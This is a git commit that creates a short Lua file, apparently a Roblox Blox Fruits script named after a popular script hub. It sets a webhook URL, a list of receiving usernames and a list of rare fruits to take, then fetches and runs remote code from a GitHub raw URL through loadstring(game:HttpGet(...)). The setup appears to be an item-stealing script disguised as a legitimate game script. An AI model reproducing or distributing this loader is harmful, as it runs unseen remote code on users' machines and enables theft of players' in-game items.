ec7ec3ba80f8e8d8443904d36a150e895d14231b
rashed1993-call <ra9496061@gmail.com>
2025-04-15 21:33:23 +0400

    Create Redz.lua

---
+++ Redz.lua
@@ -0,0 +1,7 @@
+
+
+Webhook = "https://docs.google.com/document/d/19db08nvSH1NIoFAaiEMfUgHx3mnQ1HM0/mobilebasic" -- << Your Webhook
+Usernames = {"x9foora1", "vin1115gh"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti",} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
